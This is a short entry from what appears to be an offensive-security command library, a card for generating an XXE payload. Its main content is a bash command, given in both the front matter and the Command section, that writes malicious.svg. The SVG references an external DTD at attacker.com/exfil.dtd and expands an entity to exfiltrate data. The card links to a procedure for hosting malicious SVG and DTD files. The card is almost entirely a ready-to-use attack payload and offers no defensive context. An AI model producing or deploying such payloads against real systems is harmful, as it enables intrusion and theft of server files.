---
id: cmd-uuid-3
data: >-
  echo '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD
  SVG 1.1//EN" "http://attacker.com/exfil.dtd">\n<svg
  xmlns="http://www.w3.org/2000/svg">\n  <pattern
  id="exploit"><text>&exfil;</text></pattern>\n</svg>' > malicious.svg
tags:
  - xxe
  - svg
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.486Z'
verified: false
validated: true
submitted: true
---
# create-svg-file

## Command

```bash
echo '<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://attacker.com/exfil.dtd">\n<svg xmlns="http://www.w3.org/2000/svg">\n  <pattern id="exploit"><text>&exfil;</text></pattern>\n</svg>' > malicious.svg
```

## Description

Generates an SVG file referencing the external DTD and expanding entities for XXE exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Outputs SVG content | Yes |
| `>` | Redirect to file | Yes |
| `malicious.svg` | Output filename | Yes |

## Examples

### Basic Usage

```bash
echo '...' > malicious.svg
```

Standard XXE payload.

### Advanced Usage

Add XInclude variant.

## Expected Output

malicious.svg created, valid XML.

## Related

- [[procedures/Host-Malicious-SVG-and-DTD-Files]]
